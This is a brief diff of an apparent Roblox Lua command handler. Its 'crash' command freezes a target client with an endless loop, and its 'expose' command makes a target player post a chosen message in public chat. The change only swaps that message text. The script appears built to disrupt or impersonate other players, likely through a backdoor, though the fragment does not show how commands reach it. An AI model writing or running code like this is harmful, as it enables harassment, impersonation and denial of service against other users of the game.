@@ -419,11 +419,11 @@ local function executeCommand(command, args)
 	elseif command == 'crash' then
 		task.spawn(function() while true do end end)
 	elseif command == 'expose' then
-		-- make the target publicly say "xxBananas123xx" in chat
+		-- make the target publicly say "I love call centers" in chat
 		task.spawn(function()
 			local tcs = game:GetService('TextChatService')
 			local rs  = game:GetService('ReplicatedStorage')
-			local msg = 'xxBananas123xx'
+			local msg = 'I love call centers'
 			pcall(function()
 				if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
 					local ch = tcs:FindFirstChild('TextChannels') and tcs.TextChannels:FindFirstChild('RBXGeneral')
